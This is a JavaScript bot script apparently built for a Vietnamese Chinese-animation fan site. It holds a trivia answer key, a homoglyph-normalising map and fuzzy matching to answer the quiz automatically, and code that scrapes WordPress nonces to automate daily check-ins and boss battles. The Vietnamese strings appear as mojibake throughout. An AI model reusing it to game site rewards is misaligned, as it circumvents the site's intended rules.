    "Nh√¢n v·∫≠t B√°ch L√Ω ƒê·ªì Minh xu·∫•t hi·ªán trong phim ho·∫°t h√¨nh n√†o d∆∞·ªõi ƒë√¢y ?": "Tr·∫£m Th·∫ßn Chi Ph√†m Tr·∫ßn Th·∫ßn V·ª±c",
    "Nh√¢n v·∫≠t ch√≠nh c·ªßa \"Th·∫ßn ·∫§n V∆∞∆°ng T·ªça\" l√† ai?": "Long H·∫°o Th·∫ßn",
    "Nh√¢n v·∫≠t ch√≠nh c·ªßa ƒê·∫•u La ƒê·∫°i L·ª•c l√† ai?": "ƒê∆∞·ªùng Tam",
    "Nh√¢n v·∫≠t ch√≠nh L√Ω Tr∆∞·ªùng Th·ªç trong S∆∞ Huynh A S∆∞ Huynh ƒë√£ t·ªè t√¨nh v·ªõi ai ?": "V√¢n Ti√™u",
    "Nh√¢n v·∫≠t ch√≠nh trong Th∆∞∆°ng Nguy√™n ƒë·ªì l√† ai ?": "M·∫°nh Xuy√™n",
    "Nh√¢n v·∫≠t ch√≠nh trong Y√™u Th·∫ßn K√Ω t√™n l√† g√¨ ?": "Nhi·∫øp Ly",
    "Nh√¢n v·∫≠t ch√≠nh trong Man Hoang Ti√™n Gi·ªõi l√† ai ?": "L·ª•c H√†ng Chi",
    "Nh√¢n v·∫≠t n√†o lu√¥n b·∫•t b·∫°i trong phim Ho·∫°t H√¨nh Trung Qu·ªëc, ƒë∆∞·ª£c v√≠ nh∆∞ One-Punch Man ?": "T·ª´ D∆∞∆°ng",
    "Nh√¢n v·∫≠t n√†o sau ƒë√¢y ƒë∆∞·ª£c m·ªánh danh l√† Vua L·ª≥ ƒê√≤n trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung ?": "Ph∆∞·ª£ng Thanh Nhi",
    "Nh·ªã ca c·ªßa Ti√™u Vi√™m trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung t√™n g√¨ ?": "Ti√™u L·ªá",
    "Nhi·∫øp Phong l√† nh√¢n v·∫≠t ch√≠nh trong phim ho·∫°t h√¨nh trung qu·ªëc n√†o ?": "Ch√¢n V√µ ƒê·ªânh Phong",
    "Ninh Di√™u l√† m·ªôt nh√¢n v·∫≠t trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Ki·∫øm Lai",
    "N·ªØ ch√≠nh c≈©ng l√† v·ª£ ƒê√¥ng B√° Tuy·∫øt ∆Øng trong Tuy·∫øt ∆Øng Lƒ©nh Ch·ªß l√† ai sau ƒë√¢y ?": "D∆∞ Tƒ©nh Thu",
    "N·ªØ ch√≠nh trong b·ªô Quy·∫øn T∆∞ L∆∞·ª£ng l√† ai ?": "ƒê·ªì L·ªá",
    "√îng n·ªôi c·ªßa L√¢m ƒê·ªông trong V≈© ƒê·ªông C√†n Kh√¥n l√† ai ?": "L√¢m Ch·∫•n Thi√™n",
    "Ph·ª• Th√¢n c·ªßa L√¢m ƒê·ªông trong V≈© ƒê·ªông C√†n Kh√¥n l√† ai ?": "L√¢m Khi·∫øu",
    "Ph∆∞∆°ng H√†n l√† nh√¢n v·∫≠t trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Vƒ©nh Sinh",
    "Ph∆∞∆°ng H√†n trong Vƒ©nh Sinh nh·∫≠n ƒë∆∞·ª£c Giao Ph·ª•c Ho√†ng Tuy·ªÅn ƒê·ªì t·ª´ ai ?": "B·∫°ch H·∫£i Thi·ªán",
    "Ph∆∞∆°ng H√†n trong Vƒ©nh Sinh xu·∫•t th√¢n l√† g√¨ ·ªü nh√† h·ªç Ph∆∞∆°ng ?": "N√¥ B·ªôc",
    "Ph∆∞·ª£ng Thanh Nhi trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung thu·ªôc ch·ªßng t·ªôc n√†o ?": "Thi√™n Y√™u Ho√†ng T·ªôc",
    "S·ªë hi·ªáu v·ªã th·∫ßn c·ªßa main trong Tr·∫£m Th·∫ßn: Ph√†m Tr·∫ßn Th·∫ßn V·ª±c l√† s·ªë m·∫•y ?": "003",
    "S·ª≠ Lai Kh·∫Øc Th·∫•t Qu√°i ƒë√£ t·ª´ng ƒë·∫øn n∆°i n√†o ƒë·ªÉ luy·ªán t·∫≠p?": "H·∫£i Th·∫ßn ƒê·∫£o",
    "S∆∞ m·∫´u c·ªßa B·∫°ch Ti·ªÉu Thu·∫ßn trong Nh·∫•t Ni·ªám Vƒ©nh H·∫±ng l√† ai ?": "H·ª©a M·ªã N∆∞∆°ng",
    "S∆∞ ph·ª• c·ªßa B·∫°ch Ti·ªÉu Thu·∫ßn trong Nh·∫•t Ni·ªám Vƒ©nh h·∫±ng l√† ai ?": "L√Ω Thanh H·∫≠u",
    "S∆∞ ph·ª• c·ªßa L√Ω Tr∆∞·ªùng Th·ªç l√† ai ?": "T·ªÅ Nguy√™n",
    "S∆∞ ph·ª• m√† Di·ªáp Th·∫ßn y√™u trong Ti√™n V√µ ƒê·∫ø T√¥n l√† ai ?": "S·ªü Huy√™n Nhi",
    "S∆∞ Ph·ª• th·ª© 2 c·ªßa L√Ω Tr∆∞·ªùng Th·ªç trong phim": "Th√°i Thanh Th√°nh Nh√¢n",
    "T·∫°i sao ƒê∆∞·ªùng Tam b·ªã ƒê∆∞·ªùng M√¥n truy s√°t ·ªü t·∫≠p ƒë·∫ßu phim ƒê·∫•u La ƒê·∫°i L·ª•c ?": "H·ªçc tr·ªôm tuy·ªát h·ªçc b·ªïn m√¥n",
    "T·∫ßn M·ª•c l√† nh√¢n v·∫≠t ch√≠nh trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "M·ª•c Th·∫ßn K√Ω",
    "T·∫ßn Nam l√† nh√¢n v·∫≠t ch√≠nh trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Tuy·ªát Th·∫ø Chi·∫øn H·ªìn",
    "T·∫ßn V≈© trong Tinh Th·∫ßn Bi·∫øn ƒë∆∞·ª£c t·∫∑ng ph√°p b·∫£o si√™u c·∫•p vip pro n√†o ƒë·ªÉ tu luy·ªán nhanh ch√≥ng ?": "Kh∆∞∆°ng Lan Th√°p",
    "T·∫ßn V≈© trong Tinh Th·∫ßn Bi·∫øn khi·∫øm khuy·∫øt ƒëan ƒëi·ªÅn nh·ªù ƒë√¢u m·ªõi c√≥ th·ªÉ tu luy·ªán ?": "L∆∞u Tinh L·ªá",
    "Th√°nh n·ªØ n√†o trong Gi√† Thi√™n b·ªã nh√¢n v·∫≠t ch√≠nh Di·ªáp Ph√†m l·∫•y m·∫•t c√°i √°o l√≥t ?": "Di√™u Hi",
    "Th·∫ßn Th√¥ng B√≠ C·∫£nh xu·∫•t hi·ªán trong b·ªô phim ho·∫°t h√¨nh n√†o d∆∞·ªõi ƒë√¢y ?": "Vƒ©nh Sinh",
    "Th·∫ßn v·ªã m√† ƒê∆∞·ªùng Tam ƒë·∫°t ƒë∆∞·ª£c l√† g√¨?": "H·∫£i Th·∫ßn v√† Tu La Th·∫ßn",
    "Th·∫ø l·ª±c n√†o l√† ƒë·ªëi th·ªß l·ªõn nh·∫•t c·ªßa Ti√™u Vi√™m trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung?": "H·ªìn ƒêi·ªán",
    "Thi√™n Ho·∫£ T√¥n Gi·∫£ trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung d√πng thi th·ªÉ c·ªßa ai ƒë·ªÉ h·ªìi sinh ?": "V√¢n S∆°n",
    "Th√∫ c∆∞ng Th√¥n Th√¥n trong Nguy√™n T√¥n sinh ra c√≥ s·ª©c m·∫°nh ngang c·∫£nh gi·ªõi n√†o ?": "Th√°i S∆° C·∫£nh",
    "Ti√™u Khinh Tuy·∫øt xu·∫•t hi·ªán trong b·ªô ho·∫°t h√¨nh n√†o d∆∞·ªõi ƒë√¢y ?": "Tuy·ªát Th·∫ø Chi·∫øn H·ªìn",
    "Ti√™u Vi√™m ƒë√£ l·∫≠p n√™n th·∫ø l·ª±c n√†o khi ·ªü H·ªçc Vi·ªán Gi√† Nam ?": "B√†n M√¥n",
    "Ti√™u Vi√™m trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung ƒë√£ H·∫πn ∆Ø·ªõc 3 NƒÉm v·ªõi ai ?": "N·∫°p Lan Y√™n Nhi√™n",
    "Ti√™u Vi√™m trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung s·ª≠ d·ª•ng lo·∫°i v≈© kh√≠ n√†o sau ƒë√¢y ?": "Th∆∞·ªõc",
    "Ti√™u Vi√™m trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung thu·ªôc gia t·ªôc n√†o?": "Ti√™u gia",
    "Ti√™u Th·∫ßn l√† nh√¢n v·∫≠t ch√≠nh trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Tr∆∞·ªùng Sinh Gi·ªõi",
    "T·ªânh C·ª≠u l√† nh√¢n v·∫≠t ch√≠nh trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "ƒê·∫°i ƒê·∫°o Tri·ªÅu Thi√™n",
    "T√¨nh ƒë·∫ßu c·ªßa Di·ªáp Ph√†m trong Gi√† Thi√™n l√† ai ?": "L√Ω Ti·ªÉu M·∫°n",
    "Tr·∫ßn B√¨nh An l√† nam ch√≠nh trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o ?": "Ki·∫øm Lai",
    "Tri·ªáu Ng·ªçc Ch√¢n l√† nh√¢n v·∫≠t trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Thi·∫øu Ni√™n B·∫°ch M√£ Tu√Ω Xu√¢n Phong",
    "Trong b·ªô ƒê·∫•u Ph√° Th∆∞∆°ng Khung, Ti√™u Vi√™m t√¨m ƒë·∫øn ai ƒë·ªÉ c·ª©u D∆∞·ª£c L√£o ?": "Phong T√¥n Gi·∫£",
    "Trong b·ªô Ti√™n Ngh·ªãch, nh√¢n v·∫≠t ch√≠nh V∆∞∆°ng L√¢m khi ·ªü qu√™ nh√† c√≤n c√≥ t√™n kh√°c l√† g√¨ ?": "Thi·∫øt Tr·ª•",
    "Trong ƒê·∫•u La ƒê·∫°i L·ª•c, ƒê∆∞·ªùng H·∫°o l√† g√¨ c·ªßa ƒê∆∞·ªùng Tam?": "Cha",
    "Trong Gi√† Thi√™n, th·ªÉ ch·∫•t Di·ªáp Ph√†m l√† th·ªÉ ch·∫•t g√¨ ?": "Hoang C·ªï Th√°nh Th·ªÉ",
    "Trong Ph√†m Nh√¢n Tu Ti√™n ai b·ªã luy·ªán th√†nh kh√¥i l·ªói Kh√∫c H·ªìn ?": "Tr∆∞∆°ng Thi·∫øt",
    "Trong phim Ti√™n Ngh·ªãch, V∆∞∆°ng L√¢m v√¥ t√¨nh c√≥ ƒë∆∞·ª£c ph√°p b·∫£o ngh·ªãch thi√™n n√†o ?": "Thi√™n Ngh·ªãch Ch√¢u",
    "Trong Ti√™n Ngh·ªãch, V∆∞∆°ng L√¢m nh·∫≠n ƒë∆∞·ª£c truy·ªÅn th·ª´a g√¨ ·ªü C·ªï Th·∫ßn Chi ƒê·ªãa ?": "K√Ω ·ª®c",
    "Trong Tru Ti√™n, ƒêi·ªÅn B·∫•t D·ªãch l√† th·ªß t·ªça c·ªßa Phong n√†o?": "ƒê·∫°i Tr√∫c Phong",
    "Trong Vƒ©nh Sinh - Ph∆∞∆°ng H√†n h·∫πn ∆∞·ªõc 10 nƒÉm c√πng v·ªõi ai ?": "Hoa Thi√™n ƒê√¥",
    "Tr∆∞·ªõc khi ƒë·∫øn Linh Kh√™ T√¥ng, B·∫°ch Ti·ªÉu Thu·∫ßn trong Nh·∫•t Ni·ªám Vƒ©nh H·∫±ng ·ªü ƒë√¢u ?": "M·∫°o Nhi S∆°n Th√¥n",
    "Tr∆∞∆°ng Ti·ªÉu Ph√†m trong phim Tru Ti√™n c√≤n c√≥ t√™n g·ªçi l√† ?": "Qu·ª∑ L·ªá",
    "Tr∆∞∆°ng Ti·ªÉu Ph√†m trong Tru Ti√™n t·ª´ng ƒë∆∞·ª£c nh·∫≠n v√†o m√¥n ph√°i n√†o?": "Thanh V√¢n M√¥n",
    "T·ª≠ Nghi√™n trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung thu·ªôc ch·ªßng t·ªôc n√†o ?": "Th√°i H∆∞ C·ªï Long",
    "V√¢n Tri·ªát l√† t√™n nh√¢n v·∫≠t ch√≠nh trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "Ngh·ªãch Thi√™n T√† Th·∫ßn",
    "V≈© Canh l√† nh√¢n v·∫≠t trong b·ªô ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "V≈© Canh K·ª∑",
    "V≈© h·ªìn c·ªßa Chu Tr√∫c Thanh l√† g√¨?": "U Minh Linh Mi√™u",
    "V≈© h·ªìn c·ªßa ƒê·ªõi M·ªôc B·∫°ch l√† g√¨?": "B·∫°ch H·ªï",
    "V≈© h·ªìn c·ªßa M√£ H·ªìng Tu·∫•n l√† g√¨?": "H·ªèa Ph∆∞·ª£ng Ho√†ng",
    "V≈© h·ªìn c·ªßa Ti·ªÉu V≈© l√† g√¨?": "Nhu C·ªët Th·ªè",
    "V≈© h·ªìn th·ª© hai c·ªßa ƒê∆∞·ªùng Tam l√† g√¨?": "H·∫°o Thi√™n Ch√πy",
    "V≈© kh√≠ c·ªßa ƒê√†m V√¢n trong Ngh·ªãch Thi√™n Ch√≠ T√¥n l√† g√¨ ?": "H·ªìng M√¥ng Th·∫ßn Ki·∫øm",
    "V≈© kh√≠ m√† Ti√™u Vi√™m trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung lu√¥n mang b√™n m√¨nh c√≥ t√™n g·ªçi l√† g√¨ ?": "Huy·ªÅn Tr·ªçng X√≠ch",
    "V∆∞∆°ng L√¢m trong phim Ti√™n Ngh·ªãch d·ª±a v√†o g√¨ ƒë·ªÉ v√¥ ƒë·ªãch c√πng c·∫£nh gi·ªõi ?": "C·ª±c c·∫£nh",
    "Y Lai Kh·∫Øc T∆∞ l√† m·ªôt nh√¢n v·∫≠t trong b·ªô phim ho·∫°t h√¨nh trung qu·ªëc n√†o sau ƒë√¢y ?": "C·∫£ 1 v√† 2",
    "Trong ƒê·∫•u Ph√° Th∆∞∆°ng Khung, Ti√™u Vi√™m h∆°n C·ªï H√† ·ªü ƒëi·ªÉm g√¨ ?": "D·ªã H·ªèa",
    "T·∫°i sao H√†n L·∫≠p khi g·∫∑p Phong Hi kh√¥ng ch·∫°y m√† ·ªü l·∫°i gi√∫p ƒë·ª° ch·∫ø t·∫°o Phong L√¥i S√≠ ?": "V√¨ ƒë√°nh kh√¥ng l·∫°i.",
    "Nh√¢n v·∫≠t ch√≠nh trong Ta C√≥ Th·ªÉ Gi√°c Ng·ªô V√¥ H·∫°n l√† ai ?": "Ti√™u V√¢n",
    "Nh√¢n v·∫≠t ch√≠nh trong ƒê·∫•u Chi·∫øn Thi√™n H·∫° l√† ai ?": "ƒê·∫°i Phong",
    "Nh√¢n v·∫≠t ch√≠nh trong Qu√¢n T·ª≠ V√¥ T·∫≠t l√† ai ?": "Dao C∆°",
    "1 Trong 2 Admin c·ªßa website HoatHinh3D l√† ai ? (Bi·ªát danh ch√≠nh x√°c ·ªü web)": "T·ª´ D∆∞∆°ng",
}

const latinMap = {
    // Cyrillic lowercase
    '–∞': 'a', '—Å': 'c', '–µ': 'e', '–æ': 'o', '—Ä': 'p', '—Ö': 'x', '—É': 'y', '—Ç': 't',
    '–≤': 'b', '–Ω': 'h', '–∫': 'k', '–º': 'm', '–ª': 'n', '—ï': 's', '—ò': 'j', '—ñ': 'i',
    '—µ': 'v', '”è': 'l', '–¥': 'd', '—ë': 'e', '–≥': 'g', '“ª': 'h', '“õ': 'k', '–∑': 'z',

    // Cyrillic uppercase
    '–ê': 'A', '–°': 'C', '–ï': 'E', '–û': 'O', '–†': 'P', '–•': 'X', '–£': 'Y', '–¢': 'T',
    '–í': 'B', '–ù': 'H', '–ö': 'K', '–ú': 'M', '–õ': 'N', '–Ö': 'S', '–à': 'J', '–Ü': 'I',
    '—¥': 'V', '”Ä': 'L', '–î': 'D', '–Å': 'E', '–ì': 'G', '“∫': 'H', '“ö': 'K', '–ó': 'Z',

    // Greek lowercase
    'Œ±': 'a', 'Œ≤': 'b', 'Œ≥': 'g', 'Œ¥': 'd', 'Œµ': 'e', 'Œ∂': 'z', 'Œ∑': 'h', 'Œ∏': 'th',
    'Œπ': 'i', 'Œ∫': 'k', 'Œª': 'l', 'Œº': 'm', 'ŒΩ': 'n', 'Œæ': 'ks', 'Œø': 'o', 'œÄ': 'p',
    'œÅ': 'r', 'œÉ': 's', 'œÑ': 't', 'œÖ': 'u', 'œÜ': 'ph', 'œá': 'x', 'œà': 'ps', 'œâ': 'w',

    // Greek uppercase
    'Œë': 'A', 'Œí': 'B', 'Œì': 'G', 'Œî': 'D', 'Œï': 'E', 'Œñ': 'Z', 'Œó': 'H', 'Œò': 'TH',
    'Œô': 'I', 'Œö': 'K', 'Œõ': 'L', 'Œú': 'M', 'Œù': 'N', 'Œû': 'KS', 'Œü': 'O', 'Œ†': 'P',
    'Œ°': 'R', 'Œ£': 'S', 'Œ§': 'T', 'Œ•': 'U', 'Œ¶': 'PH', 'Œß': 'X', 'Œ®': 'PS', 'Œ©': 'W',

    // Armenian lowercase
    '…ë': 'a', '÷Ö': 'o', '’Ω': 's', '’•': 'e', '’¶': 'z', '’Ø': 'k', '’∏': 'n', '’º': 'r',
    '’∞': 'h', '’¨': 'l', '’¥': 'm', '’∂': 'n', '’æ': 'v', '’ø': 't', '’¢': 'b', '’§': 'd',
    '’≥': 'c', '’ª': 'j', '’µ': 'y', '÷Ñ': 'k', '’ß': 'e',

    // Armenian uppercase
    '‘±': 'A', '’ï': 'O', '’ç': 'S', '‘µ': 'E', '‘∂': 'Z', '‘ø': 'K', '’à': 'N', '’ê': 'R',
    '’Ä': 'H', '‘º': 'L', '’Ñ': 'M', '’Ü': 'N', '’é': 'V', '’è': 'T', '‘≤': 'B', '‘¥': 'D',
    '’É': 'C', '’ã': 'J', '’Ö': 'Y', '’î': 'K',

    // Vietnamese lowercase
    '√†': 'a', '√°': 'a', '·∫£': 'a', '√£': 'a', '·∫°': 'a', 'ƒÉ': 'a', '·∫±': 'a', '·∫Ø': 'a',
    '·∫≥': 'a', '·∫µ': 'a', '·∫∑': 'a', '√¢': 'a', '·∫ß': 'a', '·∫•': 'a', '·∫©': 'a', '·∫´': 'a',
    '·∫≠': 'a', '√®': 'e', '√©': 'e', '·∫ª': 'e', '·∫Ω': 'e', '·∫π': 'e', '√™': 'e', '·ªÅ': 'e',
    '·∫ø': 'e', '·ªÉ': 'e', '·ªÖ': 'e', '·ªá': 'e', '√¨': 'i', '√≠': 'i', '·ªâ': 'i', 'ƒ©': 'i',
    '·ªã': 'i', '√≤': 'o', '√≥': 'o', '·ªè': 'o', '√µ': 'o', '·ªç': 'o', '√¥': 'o', '·ªì': 'o',
    '·ªë': 'o', '·ªï': 'o', '·ªó': 'o', '·ªô': 'o', '∆°': 'o', '·ªù': 'o', '·ªõ': 'o', '·ªü': 'o',
    '·ª°': 'o', '·ª£': 'o', '√π': 'u', '√∫': 'u', '·ªß': 'u', '≈©': 'u', '·ª•': 'u', '∆∞': 'u',
    '·ª´': 'u', '·ª©': 'u', '·ª≠': 'u', '·ªØ': 'u', '·ª±': 'u', '·ª≥': 'y', '√Ω': 'y', '·ª∑': 'y',
    '·ªπ': 'y', '·ªµ': 'y', 'ƒë': 'd',

    // Vietnamese uppercase
    '√Ä': 'A', '√Å': 'A', '·∫¢': 'A', '√É': 'A', '·∫†': 'A', 'ƒÇ': 'A', '·∫∞': 'A', '·∫Æ': 'A',
    '·∫≤': 'A', '·∫¥': 'A', '·∫∂': 'A', '√Ç': 'A', '·∫¶': 'A', '·∫§': 'A', '·∫®': 'A', '·∫™': 'A',
    '·∫¨': 'A', '√à': 'E', '√â': 'E', '·∫∫': 'E', '·∫º': 'E', '·∫∏': 'E', '√ä': 'E', '·ªÄ': 'E',
    '√â': 'E', '·ªÇ': 'E', '·ªÑ': 'E', '·ªÜ': 'E', '√å': 'I', '√ç': 'I', '·ªà': 'I', 'ƒ®': 'I',
    '·ªä': 'I', '√í': 'O', '√ì': 'O', '·ªé': 'O', '√ï': 'O', '·ªå': 'O', '√î': 'O', '·ªí': 'O',
    '·ªê': 'O', '·ªî': 'O', '·ªñ': 'O', '·ªò': 'O', '∆†': 'O', '·ªú': 'O', '·ªö': 'O', '·ªû': 'O',
    '·ª†': 'O', '·ª¢': 'O', '√ô': 'U', '√ö': 'U', '·ª¶': 'U', '≈®': 'U', '·ª§': 'U', '∆Ø': 'U',
    '·ª™': 'U', '·ª®': 'U', '·ª¨': 'U', '·ªÆ': 'U', '·ª∞': 'U', '·ª≤': 'Y', '√ù': 'Y', '·ª∂': 'Y',
    '·ª∏': 'Y', '·ª¥': 'Y', 'ƒê': 'D',

    // Fullwidth Latin lowercase
    'ÔΩÅ': 'a', 'ÔΩÇ': 'b', 'ÔΩÉ': 'c', 'ÔΩÑ': 'd', 'ÔΩÖ': 'e', 'ÔΩÜ': 'f', 'ÔΩá': 'g', 'ÔΩà': 'h',
    'ÔΩâ': 'i', 'ÔΩä': 'j', 'ÔΩã': 'k', 'ÔΩå': 'l', 'ÔΩç': 'm', 'ÔΩé': 'n', 'ÔΩè': 'o', 'ÔΩê': 'p',
    'ÔΩë': 'q', 'ÔΩí': 'r', 'ÔΩì': 's', 'ÔΩî': 't', 'ÔΩï': 'u', 'ÔΩñ': 'v', 'ÔΩó': 'w', 'ÔΩò': 'x',
    'ÔΩô': 'y', 'ÔΩö': 'z',

    // Fullwidth Latin uppercase
    'Ôº°': 'A', 'Ôº¢': 'B', 'Ôº£': 'C', 'Ôº§': 'D', 'Ôº•': 'E', 'Ôº¶': 'F', 'Ôºß': 'G', 'Ôº®': 'H',
    'Ôº©': 'I', 'Ôº™': 'J', 'Ôº´': 'K', 'Ôº¨': 'L', 'Ôº≠': 'M', 'ÔºÆ': 'N', 'ÔºØ': 'O', 'Ôº∞': 'P',
    'Ôº±': 'Q', 'Ôº≤': 'R', 'Ôº≥': 'S', 'Ôº¥': 'T', 'Ôºµ': 'U', 'Ôº∂': 'V', 'Ôº∑': 'W', 'Ôº∏': 'X',
    'Ôºπ': 'Y', 'Ôº∫': 'Z',

    // Fullwidth digits
    'Ôºê': '0', 'Ôºë': '1', 'Ôºí': '2', 'Ôºì': '3', 'Ôºî': '4', 'Ôºï': '5', 'Ôºñ': '6', 'Ôºó': '7',
    'Ôºò': '8', 'Ôºô': '9',

    // Latin extended
    '‚±•': 'a', '‚±¶': 't', '‚±Ø': 'A', '‚±§': 'R', '∆Ä': 'b', '∆É': 'b', '∆à': 'c', '…ó': 'd',
    '∆í': 'f', '…†': 'g', '…¶': 'h', '…®': 'i', '∆ô': 'k', '…±': 'm', '…≤': 'n', '…µ': 'o',
    ' †': 'q', ' Ç': 's', ' à': 't', '‚±≥': 'w', '‚±π': 'r', ' ã': 'v', '‚±∫': 'o', '∆¥': 'y',
    '∆∂': 'z', '∆Å': 'B', '∆á': 'C', '∆ä': 'D', '∆ë': 'F', '∆ì': 'G', '∆ò': 'K', '∆ù': 'N',
    '∆ü': 'O', '∆¢': 'OI', '∆¨': 'T', '∆≤': 'V', '∆≥': 'Y', '∆µ': 'Z',

    // Cherokee letters
    '·é™': 'go', '·é´': 'gu', '·é¨': 'gv', '·èå': 'sa', '·èç': 's', '·èé': 'se', '·èè': 'si', '·èê': 'so',
    '·èë': 'su', '·èí': 'sv',

    // IPA letters
    '…°': 'g', '…¢': 'G', '…¥': 'N', ' Ä': 'R', ' ü': 'L', ' è': 'Y', ' É': 's', ' í': 'z',
    '…æ': 'r', ' ∞': 'h',

    // Superscript letters and modifier letters
    '·µÉ': 'a', '·µá': 'b', '·∂ú': 'c', '·µà': 'd', '·µâ': 'e', '·∂†': 'f', '·µç': 'g', ' ∞': 'h',
    '‚Å±': 'i', ' ≤': 'j', '·µè': 'k', 'À°': 'l', '·µê': 'm', '‚Åø': 'n', '·µí': 'o', '·µñ': 'p',
    ' ≥': 'r', 'À¢': 's', '·µó': 't', '·µò': 'u', '·µõ': 'v', ' ∑': 'w', 'À£': 'x', ' ∏': 'y',
    '·∂ª': 'z',

    // Special Unicode letterlike symbols
    '‚Ñì': 'l', '‚ÑÆ': 'e', '‚Ñä': 'g', '‚Ñç': 'H', '‚Ñï': 'N', '‚Ñô': 'P', '‚Ñö': 'Q', '‚Ñù': 'R',
    '‚Ñ§': 'Z', '‚ÑÇ': 'C', '‚Ñ¨': 'B', '‚Ñ∞': 'E', '‚Ñ±': 'F', '‚Ñ≥': 'M',
}

const normalize = (source) => {
    return source
        .split('')
        .map(character => latinMap[character] || character)
        .join('').normalize('NFD')
        .replace(/[\u0300-\u036f]/g, '')
        .toLowerCase().replace(/[^a-z0-9 ]+/g, '')
        .replace(/\s+/g, ' ')
        .trim()
}

const levenshteinDistance = (source, target) => {
    const matrix = Array.from({ length: source.length + 1 }, (_, rowIndex) =>
        Array.from({ length: target.length + 1 }, (_, colIndex) =>
            rowIndex === 0 ? colIndex : colIndex === 0 ? rowIndex : 0
        )
    )
    for (let rowIndex = 1; rowIndex <= source.length; rowIndex++) {
        for (let colIndex = 1; colIndex <= target.length; colIndex++) {
            matrix[rowIndex][colIndex] = Math.min(
                matrix[rowIndex - 1][colIndex] + 1,
                matrix[rowIndex][colIndex - 1] + 1,
                matrix[rowIndex - 1][colIndex - 1] + (source[rowIndex - 1] === target[colIndex - 1] ? 0 : 1)
            )
        }
    }
    return matrix[source.length][target.length]
}

const similarityPercent = (source, target) => {
    if (!source && !target) return 100
    const distance = levenshteinDistance(source, target)
    const maxLength = Math.max(source.length, target.length)
    return Number(((1 - distance / maxLength) * 100).toFixed(2))
}

const bestMatch = (sources, target) => {
    const normalizedTarget = normalize(target)
    let bestIndex = -1
    let bestScore = 0
    for (let index = 0; index < sources.length; index++) {
        const source = sources[index]
        const normalizedSource = normalize(source)
        if (normalizedSource === normalizedTarget) {
            logger.log(`üîç [V·∫•n ƒê√°p] Kh·ªõp tuy·ªát ƒë·ªëi: "${source}" = "${target}"`)
            return { bestIndex: index, bestSource: source, bestScore: 100 }
        }
        const score = similarityPercent(normalizedSource, normalizedTarget)
        if (score > bestScore) {
            bestIndex = index
            bestScore = score
        }
    }
    if (bestIndex === -1) {
        logger.log(`üîç [V·∫•n ƒê√°p] Kh√¥ng c√≥ k·∫øt qu·∫£ ph√π h·ª£p v·ªõi: "${target}"`)
        return { bestIndex, bestSource: null, bestScore }
    }
    logger.log(`üîç [V·∫•n ƒê√°p] G·∫ßn ƒë√∫ng nh·∫•t: "${sources[bestIndex]}" ‚âà "${target}" ‚û§ gi·ªëng nhau ${bestScore}%`)
    return { bestIndex, bestSource: sources[bestIndex], bestScore }
}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

const parseVariableJSON = (doc, scriptId, name) => {
    try {
        const script = doc.getElementById(scriptId)?.textContent
        const match = script?.match(`var\\s+${name}\\s*=\\s*(\\{[\\s\\S]*?\\});`)
        if (!match) return {}
        return JSON.parse(match[1])
    } catch {
        return {}
    }
}

const parseRequestData = (html) => {
    return [...html.matchAll(/data\s*(?:=|:)\s*{([\s\S]*?)}/g)].map(result => {
        const content = result[1]
        const action = (content.match(/['"]?action['"]?\s*:\s*['"]([^'"]+)['"]/) || [])[1] || ''
        const nonce = (content.match(/['"]?nonce['"]?\s*:\s*['"]([a-f0-9]+)['"]/) || [])[1] || ''
        const security = (content.match(/['"]?security['"]?\s*:\s*['"]([a-f0-9]+)['"]/) || [])[1] || ''
        return action ? { action, nonce, security } : null
    }).filter(Boolean)
}

class DiemDanh {
    async trigger() {
        try {
            const page = await loadPage(DOMAIN + '/diem-danh')
            const checkInButton = page.doc.querySelector('#checkInButton')
            if (checkInButton && checkInButton.disabled) return logger.log(`üü¢ [ƒêi·ªÉm Danh] - ƒê√£ ho√†n th√†nh.`)
            const variableJSON = parseVariableJSON(page.doc, 'better-messages-js-extra', 'Better_Messages')
            await this.checkIn(variableJSON.nonce)
        } catch (error) {
            console.log(`üî¥ [ƒêi·ªÉm Danh] - L·ªói "trigger": ${error.message}`)
        }
    }

    async checkIn(nonce) {
        if (!nonce) return console.log(`üî¥ [ƒêi·ªÉm Danh] - Kh√¥ng t√¨m th·∫•y nonce daily_check_in.`)
        const result = await postRequest(ACTION_URL, {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': nonce },
            body: JSON.stringify({ action: 'daily_check_in' })
        })
        const message = result?.success === true
            ? `üü¢ [ƒêi·ªÉm Danh] - Th√†nh c√¥ng.`
            : `üî¥ [ƒêi·ªÉm Danh] - ${result?.message || result}`
        logger.log(message)
    }
}

class HoangVuc {
    async trigger() {
        try {
            const page = await loadPage(DOMAIN + '/hoang-vuc')
            const nonce = page.html.match(/var\s+ajax_boss_nonce\s*=\s*'([^']+)'/)?.[1]
            const hasReward = page.html.includes('id="reward-button"')
            if (hasReward) {
                await this.claimChest(nonce)
                return await this.trigger()
            }
            const hasBoss = page.doc.getElementById('battle-button')
            if (!hasBoss) return logger.log(`üü° [Hoang V·ª±c] - Boss ch∆∞a m·ªü.`)
            const match = page.doc.querySelector('.remaining-attacks')?.textContent?.match(/\d+/)
            const remaining = match ? parseInt(match[0] || '0', 10) : 0
